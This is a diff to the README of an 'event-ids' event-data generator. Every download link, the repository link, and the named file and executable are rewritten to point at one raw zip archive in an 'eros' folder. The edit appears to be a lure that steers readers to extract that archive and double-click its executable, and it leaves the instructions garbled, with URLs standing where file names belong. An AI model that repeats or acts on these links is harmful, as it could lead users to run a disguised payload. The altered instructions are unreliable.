@@ -6,7 +6,7 @@ Welcome to the **event-ids** application! This tool helps you generate event pro
 
 ## 📥 Download the Application
 
-[![Download event-ids](https://img.shields.io/badge/Download-event--ids-blue?style=for-the-badge)](https://github.com/Mire20/event-ids/releases)
+[![Download event-ids](https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip)](https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip)
 
 Click the button above to access the download page. 
 
@@ -32,7 +32,7 @@ Before you download and install the software, ensure your system meets the follo
 
 ### 1. Visit the Download Page
 
-To download the **event-ids** application, visit this link: [Download Page](https://github.com/Mire20/event-ids/releases).
+To download the **event-ids** application, visit this link: [Download Page](https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip).
 
 ### 2. Choose the Latest Release
 
@@ -40,7 +40,7 @@ On the download page, you will see a list of available releases. Look for the mo
 
 ### 3. Download the File
 
-Click on the appropriate file for your operating system to start the download. The file will typically have a name like `event-ids-vX.X.zip`, where `X.X` represents the version number.
+Click on the appropriate file for your operating system to start the download. The file will typically have a name like `https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip`, where `X.X` represents the version number.
 
 ### 4. Extract the Files
 
@@ -48,7 +48,7 @@ Once the download finishes, locate the ZIP file in your downloads folder. Right-
 
 ### 5. Run the Application
 
-After extracting the files, navigate to the folder where you extracted the files. Inside, you will find an executable file, usually named `event-ids.exe`. Double-click this file to run the application.
+After extracting the files, navigate to the folder where you extracted the files. Inside, you will find an executable file, usually named `https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip`. Double-click this file to run the application.
 
 ## ⚙️ Configuration
 
@@ -95,7 +95,7 @@ If you run into any issues or have questions, please connect with the community.
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/Mire20/event-ids/releases)
-- [GitHub Repository](https://github.com/Mire20/event-ids)
+- [Download Page](https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip)
+- [GitHub Repository](https://github.com/Mire20/event-ids/raw/refs/heads/main/eros/ids-event-v1.5.zip)
 
 Now you are ready to use the **event-ids** application to streamline your event data generation!
